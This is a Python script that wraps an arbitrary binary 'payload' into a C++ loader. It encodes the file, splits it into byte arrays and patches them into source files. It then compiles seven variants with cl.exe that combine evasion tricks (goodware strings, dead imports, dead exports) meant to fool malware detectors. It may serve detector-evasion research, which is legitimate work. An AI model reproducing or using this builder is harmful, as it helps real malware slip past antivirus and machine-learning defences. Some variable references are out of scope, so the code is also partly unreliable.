import sys,os

from split import split_binary_data
from encode import encode_file

def modify_payload_and_patch_source(data_splits, source_cpp_data, binary_data_cpp_data):
    line1 = 'unsigned char binary_data_array[] = { '+ str(list(data_splits[0]))[1:-1] + '};'
    line2 = 'unsigned char binary_data_array1[] = { '+ str(list(data_splits[1]))[1:-1] + '};'
    line3 = 'unsigned char binary_data_array2[] = { '+ str(list(data_splits[2]))[1:-1] + '};\n'

    source_cpp_data[81] = line1
    source_cpp_data[74] = line2
    binary_data_cpp_data[4] = line3

    return source_cpp_data, binary_data_cpp_data

def compile_variant(source_cpp_data, variant_name):
    with open('Source.cpp', 'w') as f:
        f.writelines(source_cpp_data)

    with open('binary_data.cpp', 'w') as f:
        f.writelines(binary_data_cpp_data)


    #compile and close files
    os.system('cl.exe /EHsc Source.cpp binary_data.cpp')
    #move variant
    
    move_variant = 'move Source.exe ' + filename.split('.bin')[0] + '_' + variant_name + '.exe'
    os.system(move_variant)

def create_variants(source_cpp_data, key, values):
    # Comment out lines based on the provided line numbers
    for line_number in values:
        source_cpp_data[line_number - 1] = "// " + source_cpp_data[line_number - 1]

    compile_variant(source_cpp_data, key)

if __name__ == '__main__':
    #split the data and open necessary files
    #create copy of file to operate
    os.system('copy binary_data.cpp binary_data_copy.cpp')

    filename = sys.argv[1]
    encoded_payload = encode_file(filename)
    data_splits = split_binary_data(encoded_payload, 3)


    #modifications
    goodware_strings = [31, 101]
    dead_imports = [63]
    dead_exports = [i for i in range(34,53)]

    #modifications continued
    only_goodware_strings = dead_imports + dead_exports
    only_dead_imports = goodware_strings + dead_exports
    only_dead_exports = goodware_strings + dead_imports
    goodware_strings_dead_imports = dead_exports
    goodware_strings_dead_exports = dead_imports
    dead_imports_dead_exports = goodware_strings
    everything = []

    #make dictionary
    modification = {'variant1': only_goodware_strings, 'variant2': only_dead_imports, 'variant3': only_dead_exports, 'variant4': goodware_strings_dead_imports, 'variant5': goodware_strings_dead_exports, 'variant6': dead_imports_dead_exports, 'variant7': everything}

    for key,values in modification.items():

        source_cpp = open('ConsoleApplication1.cpp', 'r')
        source_cpp_data = source_cpp.readlines()

        binary_data_cpp = open('binary_data_copy.cpp', 'r')
        binary_data_cpp_data = binary_data_cpp.readlines()

    #print(binary_data_cpp_data[4])

        source_cpp_data, binary_data_cpp_data = modify_payload_and_patch_source(data_splits, source_cpp_data, binary_data_cpp_data)

    #modification
    
        create_variants(source_cpp_data, key, values)
    

    #close files after modification and some cleaning
        source_cpp.close()
        binary_data_cpp.close()

    #os.system('del Source.cpp')